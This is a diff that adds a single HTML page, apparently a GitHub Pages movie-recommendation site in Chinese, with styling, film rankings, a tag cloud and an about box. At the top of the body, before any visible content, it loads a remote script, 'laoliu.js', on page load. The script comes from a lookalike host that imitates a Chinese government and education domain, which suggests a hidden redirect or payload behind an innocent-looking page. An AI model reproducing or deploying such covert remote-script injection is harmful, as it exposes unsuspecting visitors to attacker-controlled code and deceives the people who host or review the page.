@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>你懂的电影网 - 懂电影，更懂你</title>
+<meta name="description" content="你懂的电影网(nidongdedianyingwang-h5)专注高质量电影推荐，懂电影更懂你的口味。提供动作、喜剧、科幻、悬疑等各类影片在线观看，手机端完美适配。">
+<meta name="keywords" content="你懂的电影网, nidongdedianyingwang-h5, 电影推荐, 在线电影, 影视资源">
+<meta name="author" content="你懂的电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://nidongdedianyingwang-h5.github.io/">
+
+<style>
+/* ===== Reset ===== */
+*, *::before, *::after {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
+    background: #0a0e0b;
+    color: #d4e8dd;
+    min-height: 100vh;
+    overflow-x: hidden;
+}
+
+a {
+    text-decoration: none;
+    color: inherit;
+}
+
+ul { list-style: none; }
+img { max-width: 100%; display: block; }
+
+/* ===== Animated Background ===== */
+.bg-orbs {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    z-index: -1;
+    overflow: hidden;
+}
+
+.orb {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(80px);
+    opacity: 0.4;
+    animation: float 20s infinite ease-in-out;
+}
+
+.orb:nth-child(1) { width: 300px; height: 300px; background: #065f46; top: -100px; left: -50px; }
+.orb:nth-child(2) { width: 400px; height: 400px; background: #047857; top: 40%; right: -100px; animation-delay: -5s; }
+.orb:nth-child(3) { width: 250px; height: 250px; background: #10b981; bottom: -80px; left: 30%; animation-delay: -10s; }
+.orb:nth-child(4) { width: 350px; height: 350px; background: #064e3b; top: 60%; left: -100px; animation-delay: -15s; }
+
+@keyframes float {
+    0%, 100% { transform: translate(0, 0) scale(1); }
+    33% { transform: translate(30px, -50px) scale(1.1); }
+    66% { transform: translate(-20px, 30px) scale(0.95); }
+}
+
+/* ===== Header ===== */
+.site-header {
+    background: rgba(10, 14, 11, 0.75);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border-bottom: 1px solid rgba(16, 185, 129, 0.2);
+    padding: 18px 30px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+}
+
+.brand {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+}
+
+.brand-logo {
+    width: 42px;
+    height: 42px;
+    background: linear-gradient(135deg, #10b981, #059669);
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 22px;
+}
+
+.brand-text h1 {
+    font-size: 19px;
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: 1px;
+}
+
+.brand-text span {
+    font-size: 11px;
+    color: #6ee7b7;
+}
+
+.header-actions a {
+    padding: 8px 20px;
+    background: linear-gradient(135deg, #10b981, #059669);
+    border-radius: 20px;
+    font-size: 13px;
+    color: #fff;
+    font-weight: 500;
+    transition: transform 0.2s;
+    display: inline-block;
+}
+
+.header-actions a:hover {
+    transform: scale(1.05);
+}
+
+/* ===== Tab Navigation ===== */
+.tab-nav {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    padding: 25px 20px 10px;
+    flex-wrap: wrap;
+}
+
+.tab-btn {
+    padding: 10px 22px;
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(16, 185, 129, 0.2);
+    border-radius: 25px;
+    color: #a7f3d0;
+    font-size: 14px;
+    cursor: pointer;
+    transition: all 0.3s;
+}
+
+.tab-btn:hover,
+.tab-btn.active {
+    background: linear-gradient(135deg, #10b981, #059669);
+    color: #fff;
+    border-color: transparent;
+    box-shadow: 0 4px 15px rgba(16,185,129,0.4);
+}
+
+/* ===== Hero ===== */
+.hero-wrap {
+    padding: 40px 30px 30px;
+    text-align: center;
+}
+
+.hero-badge {
+    display: inline-block;
+    padding: 6px 18px;
+    background: rgba(16,185,129,0.15);
+    border: 1px solid rgba(16,185,129,0.3);
+    border-radius: 20px;
+    font-size: 12px;
+    color: #6ee7b7;
+    margin-bottom: 18px;
+}
+
+.hero-wrap h2 {
+    font-size: 38px;
+    font-weight: 800;
+    color: #fff;
+    margin-bottom: 12px;
+    line-height: 1.3;
+}
+
+.hero-wrap h2 span {
+    background: linear-gradient(135deg, #34d399, #10b981, #059669);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+}
+
+.hero-wrap > p {
+    font-size: 16px;
+    color: #86efac;
+    max-width: 550px;
+    margin: 0 auto;
+    opacity: 0.8;
+}
+
+/* ===== Stats Bar ===== */
+.stats-bar {
+    display: flex;
+    justify-content: center;
+    gap: 50px;
+    padding: 20px 30px;
+    flex-wrap: wrap;
+}
+
+.stat-item {
+    text-align: center;
+}
+
+.stat-item .num {
+    font-size: 28px;
+    font-weight: 700;
+    color: #34d399;
+}
+
+.stat-item .label {
+    font-size: 12px;
+    color: #6b7280;
+    margin-top: 3px;
+}
+
+/* ===== Section Title ===== */
+.sec-title {
+    text-align: center;
+    padding: 40px 20px 20px;
+}
+
+.sec-title h3 {
+    font-size: 24px;
+    color: #fff;
+    margin-bottom: 6px;
+}
+
+.sec-title p {
+    font-size: 13px;
+    color: #6b7280;
+}
+
+/* ===== 栏目一：热门排行（瀑布流） ===== */
+.rank-section {
+    padding: 20px 30px;
+}
+
+.rank-list {
+    max-width: 900px;
+    margin: 0 auto;
+}
+
+.rank-item {
+    display: flex;
+    gap: 16px;
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(16,185,129,0.1);
+    border-radius: 14px;
+    padding: 14px;
+    margin-bottom: 12px;
+    transition: all 0.3s;
+    align-items: center;
+}
+
+.rank-item:hover {
+    background: rgba(16,185,129,0.08);
+    border-color: rgba(16,185,129,0.3);
+    transform: translateX(5px);
+}
+
+.rank-num {
+    width: 36px;
+    height: 36px;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    font-weight: 700;
+    flex-shrink: 0;
+}
+
+.rank-num.gold { background: linear-gradient(135deg, #fbbf24, #f59e0b); color: #fff; }
+.rank-num.silver { background: linear-gradient(135deg, #d1d5db, #9ca3af); color: #fff; }
+.rank-num.bronze { background: linear-gradient(135deg, #fb923c, #ea580c); color: #fff; }
+.rank-num.normal { background: rgba(16,185,129,0.15); color: #34d399; }
+
+.rank-cover {
+    width: 60px;
+    height: 80px;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 28px;
+    flex-shrink: 0;
+}
+
+.rank-info {
+    flex: 1;
+    min-width: 0;
+}
+
+.rank-info h4 {
+    font-size: 15px;
+    color: #f0fdf4;
+    margin-bottom: 4px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+
+.rank-info p {
+    font-size: 12px;
+    color: #6b7280;
+}
+
+.rank-score {
+    text-align: right;
+    flex-shrink: 0;
+}
+
+.rank-score .score {
+    font-size: 18px;
+    font-weight: 700;
+    color: #fbbf24;
+}
+
+.rank-score .views {
+    font-size: 11px;
+    color: #6b7280;
+}
+
+/* ===== 栏目二：最新上线（卡片网格） ===== */
+.latest-section {
+    padding: 20px 30px;
+}
+
+.latest-grid {
+    max-width: 1100px;
+    margin: 0 auto;
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 18px;
+}
+
+.latest-card {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(16,185,129,0.1);
+    border-radius: 14px;
+    overflow: hidden;
+    transition: all 0.3s;
+}
+
+.latest-card:hover {
+    transform: translateY(-4px);
+    border-color: rgba(16,185,129,0.35);
+    box-shadow: 0 10px 30px rgba(16,185,129,0.15);
+}
+
+.latest-cover {
+    height: 140px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 40px;
+    position: relative;
+}
+
+.latest-cover .tag {
+    position: absolute;
+    top: 8px;
+    left: 8px;
+    padding: 3px 8px;
+    background: rgba(0,0,0,0.6);
+    border-radius: 4px;
+    font-size: 10px;
+    color: #fff;
+}
+
+.latest-cover .tag.hot { background: #ef4444; }
+.latest-cover .tag.new { background: #10b981; }
+
+.latest-body {
+    padding: 12px;
+}
+
+.latest-body h4 {
+    font-size: 14px;
+    color: #f0fdf4;
+    margin-bottom: 4px;
+}
+
+.latest-body p {
+    font-size: 11px;
+    color: #6b7280;
+}
+
+/* 不同封面配色 */
+.cover-1 { background: linear-gradient(135deg, #065f46, #047857); }
+.cover-2 { background: linear-gradient(135deg, #1e40af, #3b82f6); }
+.cover-3 { background: linear-gradient(135deg, #7c3aed, #a78bfa); }
+.cover-4 { background: linear-gradient(135deg, #c2410c, #ea580c); }
+.cover-5 { background: linear-gradient(135deg, #be185d, #ec4899); }
+.cover-6 { background: linear-gradient(135deg, #0e7490, #06b6d4); }
+.cover-7 { background: linear-gradient(135deg, #a16207, #eab308); }
+.cover-8 { background: linear-gradient(135deg, #b91c1c, #f87171); }
+
+/* ===== 栏目三：标签云 ===== */
+.tag-section {
+    padding: 20px 30px;
+}
+
+.tag-cloud {
+    max-width: 800px;
+    margin: 0 auto;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+    justify-content: center;
+}
+
+.tag-cloud a {
+    padding: 8px 16px;
+    background: rgba(255,255,255,0.04);
+    border: 1px solid rgba(16,185,129,0.15);
+    border-radius: 8px;
+    font-size: 13px;
+    color: #a7f3d0;
+    transition: all 0.3s;
+}
+
+.tag-cloud a:hover {
+    background: rgba(16,185,129,0.15);
+    color: #fff;
+    border-color: rgba(16,185,129,0.4);
+}
+
+.tag-cloud a.size-lg { font-size: 17px; padding: 10px 20px; background: rgba(16,185,129,0.1); }
+.tag-cloud a.size-xl { font-size: 20px; padding: 12px 24px; background: rgba(16,185,129,0.15); color: #fff; }
+
+/* ===== 栏目四：站点信息 ===== */
+.info-section {
+    padding: 20px 30px 40px;
+}
+
+.info-box {
+    max-width: 700px;
+    margin: 0 auto;
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(16,185,129,0.1);
+    border-radius: 16px;
+    padding: 30px;
+    text-align: center;
+}
+
+.info-box .info-icon {
+    width: 60px;
+    height: 60px;
+    border-radius: 16px;
+    background: linear-gradient(135deg, #10b981, #059669);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 28px;
+    margin: 0 auto 16px;
+}
+
+.info-box h4 {
+    font-size: 18px;
+    color: #fff;
+    margin-bottom: 10px;
+}
+
+.info-box p {
+    font-size: 14px;
+    color: #9ca3af;
+    line-height: 1.7;
+    margin-bottom: 8px;
+}
+
+.info-box .site-url {
+    color: #34d399;
+    font-weight: 600;
+}
+
+.info-actions {
+    margin-top: 20px;
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    flex-wrap: wrap;
+}
+
+.info-actions a {
+    padding: 9px 22px;
+    border-radius: 20px;
+    font-size: 13px;
+    transition: all 0.3s;
+}
+
+.info-actions .btn-primary {
+    background: linear-gradient(135deg, #10b981, #059669);
+    color: #fff;
+}
+
+.info-actions .btn-primary:hover {
+    box-shadow: 0 4px 15px rgba(16,185,129,0.4);
+}
+
+.info-actions .btn-outline {
+    border: 1px solid rgba(16,185,129,0.4);
+    color: #6ee7b7;
+}
+
+.info-actions .btn-outline:hover {
+    background: rgba(16,185,129,0.1);
+}
+
+/* ===== Footer ===== */
+.site-footer {
+    background: rgba(0,0,0,0.4);
+    border-top: 1px solid rgba(16,185,129,0.1);
+    padding: 25px 20px;
+    text-align: center;
+}
+
+.site-footer p {
+    font-size: 12px;
+    color: #4b5563;
+    margin-bottom: 4px;
+}
+
+.site-footer a {
+    color: #059669;
+}
+
+/* ===== Mobile ===== */
+@media (max-width: 1024px) {
+    .latest-grid {
+        grid-template-columns: repeat(3, 1fr);
+    }
+}
+
+@media (max-width: 768px) {
+    .site-header {
+        padding: 12px 16px;
+    }
+
+    .brand-text h1 { font-size: 16px; }
+
+    .header-actions a {
+        padding: 6px 14px;
+        font-size: 12px;
+    }
+
+    .tab-nav {
+        padding: 15px 12px 5px;
+    }
+
+    .tab-btn {
+        padding: 7px 14px;
+        font-size: 12px;
+    }
+
+    .hero-wrap {
+        padding: 25px 16px 20px;
+    }
+
+    .hero-wrap h2 {
+        font-size: 26px;
+    }
+
+    .stats-bar {
+        gap: 25px;
+        padding: 15px 16px;
+    }
+
+    .rank-section,
+    .latest-section,
+    .tag-section,
+    .info-section {
+        padding: 15px 16px;
+    }
+
+    .latest-grid {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 12px;
+    }
+
+    .rank-item {
+        padding: 10px;
+        gap: 10px;
+    }
+
+    .rank-cover {
+        width: 48px;
+        height: 64px;
+        font-size: 22px;
+    }
+
+    .rank-info h4 {
+        font-size: 13px;
+    }
+
+    .rank-score .score {
+        font-size: 15px;
+    }
+
+    .info-box {
+        padding: 20px 16px;
+    }
+}
+
+@media (max-width: 420px) {
+    .latest-grid {
+        grid-template-columns: 1fr;
+    }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 动态背景 -->
+<div class="bg-orbs">
+    <div class="orb"></div>
+    <div class="orb"></div>
+    <div class="orb"></div>
+    <div class="orb"></div>
+</div>
+
+<!-- Header -->
+<header class="site-header">
+    <div class="brand">
+        <div class="brand-logo">🎥</div>
+        <div class="brand-text">
+            <h1>你懂的电影网</h1>
+            <span>nidongdedianyingwang-h5</span>
+        </div>
+    </div>
+    <nav class="header-actions">
+        <a href="#">立即观影 #</a>
+    </nav>
+</header>
+
+<!-- Tab Nav -->
+<nav class="tab-nav">
+    <button class="tab-btn active">🔥 热门排行</button>
+    <button class="tab-btn">🆕 最新上线</button>
+    <button class="tab-btn">🏷️ 标签浏览</button>
+    <button class="tab-btn">📌 关于站点</button>
+</nav>
+
+<!-- Hero -->
+<section class="hero-wrap">
+    <div class="hero-badge">🎬 懂电影，更懂你</div>
+    <h2>你懂的电影网<br><span>精选每一帧光影</span></h2>
+    <p>为你筛选高质量影片，从经典到热门，从大片到冷门佳作</p>
+</section>
+
+<!-- Stats -->
+<div class="stats-bar">
+    <div class="stat-item">
+        <div class="num">10,000+</div>
+        <div class="label">影片资源</div>
+    </div>
+    <div class="stat-item">
+        <div class="num">50+</div>
+        <div class="label">影片分类</div>
+    </div>
+    <div class="stat-item">
+        <div class="num">99.9%</div>
+        <div class="label">在线可用率</div>
+    </div>
+    <div class="stat-item">
+        <div class="num">24/7</div>
+        <div class="label">全天候访问</div>
+    </div>
+</div>
+
+<!-- 栏目一：热门排行 -->
+<section class="rank-section" id="rank">
+    <div class="sec-title">
+        <h3>🔥 热门排行榜</h3>
+        <p>本周最热影片 Top 8</p>
+    </div>
+    <div class="rank-list">
+        <figure class="rank-item">
+            <div class="rank-num gold">1</div>
+            <div class="rank-cover cover-1">🏆</div>
+            <figcaption class="rank-info">
+                <h4>教父 The Godfather</h4>
+                <p>犯罪 / 剧情 · 1972 · 豆瓣9.3</p>
+            </figcaption>
+            <div class="rank-score">
+                <div class="score">9.3</div>
+                <div class="views">👁 2.1亿</div>
+            </div>
+        </figure>
+        <figure class="rank-item">
+            <div class="rank-num silver">2</div>
+            <div class="rank-cover cover-2">🌟</div>
+            <figcaption class="rank-info">
+                <h4>蝙蝠侠：黑暗骑士</h4>
+                <p>动作 / 犯罪 / 剧情 · 2008</p>
+            </figcaption>
+            <div class="rank-score">
+                <div class="score">9.2</div>
+                <div class="views">👁 1.8亿</div>
+            </div>
+        </figure>
+        <figure class="rank-item">
+            <div class="rank-num bronze">3</div>
+            <div class="rank-cover cover-3">✨</div>
+            <figcaption class="rank-info">
+                <h4>阿凡达 Avatar</h4>
+                <p>科幻 / 冒险 · 2009</p>
+            </figcaption>
+            <div class="rank-score">
+                <div class="score">8.8</div>
+                <div class="views">👁 1.6亿</div>
+            </div>
+        </figure>
+        <figure class="rank-item">
+            <div class="rank-num normal">4</div>
+            <div class="rank-cover cover-4">🎭</div>
+            <figcaption class="rank-info">
+                <h4>低俗小说 Pulp Fiction</h4>
+                <p>犯罪 / 剧情 · 1994</p>
+            </figcaption>
+            <div class="rank-score">
+                <div class="score">8.8</div>
+                <div class="views">👁 1.2亿</div>
+            </div>
+        </figure>
+        <figure class="rank-item">
+            <div class="rank-num normal">5</div>
+            <div class="rank-cover cover-5">💎</div>
+            <figcaption class="rank-info">
+                <h4>这个杀手不太冷</h4>
+                <p>动作 / 犯罪 · 1994</p>
+            </figcaption>
+            <div class="rank-score">
+                <div class="score">9.4</div>
+                <div class="views">👁 2.3亿</div>
+            </div>
+        </figure>
+        <figure class="rank-item">
+            <div class="rank-num normal">6</div>
+            <div class="rank-cover cover-6">🌊</div>
+            <figcaption class="rank-info">
+                <h4>少年派的奇幻漂流</h4>
+                <p>冒险 / 剧情 · 2012</p>
+            </figcaption>
+            <div class="rank-score">
+                <div class="score">9.1</div>
+                <div class="views">👁 1.5亿</div>
+            </div>
+        </figure>
+        <figure class="rank-item">
+            <div class="rank-num normal">7</div>
+            <div class="rank-cover cover-7">🎪</div>
+            <figcaption class="rank-info">
+                <h4>让子弹飞</h4>
+                <p>喜剧 / 动作 / 剧情 · 2010</p>
+            </figcaption>
+            <div class="rank-score">
+                <div class="score">9.0</div>
+                <div class="views">👁 1.7亿</div>
+            </div>
+        </figure>
+        <figure class="rank-item">
+            <div class="rank-num normal">8</div>
+            <div class="rank-cover cover-8">🔥</div>
+            <figcaption class="rank-info">
+                <h4>无间道</h4>
+                <p>犯罪 / 剧情 / 悬疑 · 2002</p>
+            </figcaption>
+            <div class="rank-score">
+                <div class="score">9.3</div>
+                <div class="views">👁 1.9亿</div>
+            </div>
+        </figure>
+    </div>
+</section>
+
+<!-- 栏目二：最新上线 -->
+<section class="latest-section" id="latest">
+    <div class="sec-title">
+        <h3>🆕 最新上线</h3>
+        <p>近期更新影片</p>
+    </div>
+    <div class="latest-grid">
+        <figure class="latest-card">
+            <div class="latest-cover cover-1">
+                <span class="tag hot">HOT</span>
+                🎬
+            </div>
+            <figcaption class="latest-body">
+                <h4>沙丘2 Dune: Part Two</h4>
+                <p>科幻 / 冒险 · 2024</p>
+            </figcaption>
+        </figure>
+        <figure class="latest-card">
+            <div class="latest-cover cover-2">
+                <span class="tag new">NEW</span>
+                🚀
+            </div>
+            <figcaption class="latest-body">
+                <h4>奥本海默 Oppenheimer</h4>
+                <p>剧情 / 传记 · 2023</p>
+            </figcaption>
+        </figure>
+        <figure class="latest-card">
+            <div class="latest-cover cover-3">
+                <span class="tag new">NEW</span>
+                🪄
+            </div>
+            <figcaption class="latest-body">
+                <h4>可怜的东西</h4>
+                <p>喜剧 / 科幻 · 2023</p>
+            </figcaption>
+        </figure>
+        <figure class="latest-card">
+            <div class="latest-cover cover-4">
+                <span class="tag hot">HOT</span>
+                💥
+            </div>
+            <figcaption class="latest-body">
+                <h4>疯狂的麦克斯4</h4>
+                <p>动作 / 冒险 · 2015</p>
+            </figcaption>
+        </figure>
+        <figure class="latest-card">
+            <div class="latest-cover cover-5">
+                💕
+            </div>
+            <figcaption class="latest-body">
+                <h4>爱乐之城 La La Land</h4>
+                <p>爱情 / 歌舞 · 2016</p>
+            </figcaption>
+        </figure>
+        <figure class="latest-card">
+            <div class="latest-cover cover-6">
+                🌍
+            </div>
+            <figcaption class="latest-body">
+                <h4>地球脉动 Planet Earth</h4>
+                <p>纪录片 · 2006</p>
+            </figcaption>
+        </figure>
+        <figure class="latest-card">
+            <div class="latest-cover cover-7">
+                ⚔️
+            </div>
+            <figcaption class="latest-body">
+                <h4>指环王3：王者无敌</h4>
+                <p>奇幻 / 冒险 · 2003</p>
+            </figcaption>
+        </figure>
+        <figure class="latest-card">
+            <div class="latest-cover cover-8">
+                🧠
+            </div>
+            <figcaption class="latest-body">
+                <h4>禁闭岛 Shutter Island</h4>
+                <p>悬疑 / 惊悚 · 2010</p>
+            </figcaption>
+        </figure>
+    </div>
+</section>
+
+<!-- 栏目三：标签云 -->
+<section class="tag-section" id="tags">
+    <div class="sec-title">
+        <h3>🏷️ 标签浏览</h3>
+        <p>点击标签快速筛选</p>
+    </div>
+    <div class="tag-cloud">
+        <a href="#" class="size-xl">动作</a>
+        <a href="#" class="size-lg">喜剧</a>
+        <a href="#" class="size-lg">科幻</a>
+        <a href="#" class="size-xl">悬疑</a>
+        <a href="#">爱情</a>
+        <a href="#" class="size-lg">犯罪</a>
+        <a href="#">动画</a>
+        <a href="#">恐怖</a>
+        <a href="#" class="size-lg">冒险</a>
+        <a href="#">纪录片</a>
+        <a href="#">战争</a>
+        <a href="#">历史</a>
+        <a href="#" class="size-lg">奇幻</a>
+        <a href="#">家庭</a>
+        <a href="#">音乐</a>
+        <a href="#">运动</a>
+        <a href="#">西部</a>
+        <a href="#">歌舞</a>
+        <a href="#">传记</a>
+        <a href="#">惊悚</a>
+    </div>
+</section>
+
+<!-- 栏目四：关于站点 -->
+<section class="info-section" id="about">
+    <div class="sec-title">
+        <h3>📌 关于站点</h3>
+        <p>了解你懂的电影网</p>
+    </div>
+    <div class="info-box">
+        <div class="info-icon">🎥</div>
+        <h4>你懂的电影网</h4>
+        <p>我们致力于用最专业的标准，为你精选每一部值得观看的影片。</p>
+        <p>无论是经典回顾还是院线新片，这里都有你想要的。</p>
+        <p class="site-url">https://nidongdedianyingwang-h5.github.io</p>
+        <div class="info-actions">
+            <a href="#" class="btn-primary">联系我们 #</a>
+            <a href="#" class="btn-outline">投稿合作 #</a>
+            <a href="#" class="btn-outline">意见建议 #</a>
+        </div>
+    </div>
+</section>
+
+<!-- Footer -->
+<footer class="site-footer">
+    <p>© 2026 你懂的电影网 | nidongdedianyingwang-h5</p>
+    <p>永久地址：<a href="https://nidongdedianyingwang-h5.github.io">https://nidongdedianyingwang-h5.github.io</a></p>
+    <p>Bing 搜索引擎友好 · 全端自适应 · 单页架构</p>
+</footer>
+
+</body>
+</html>
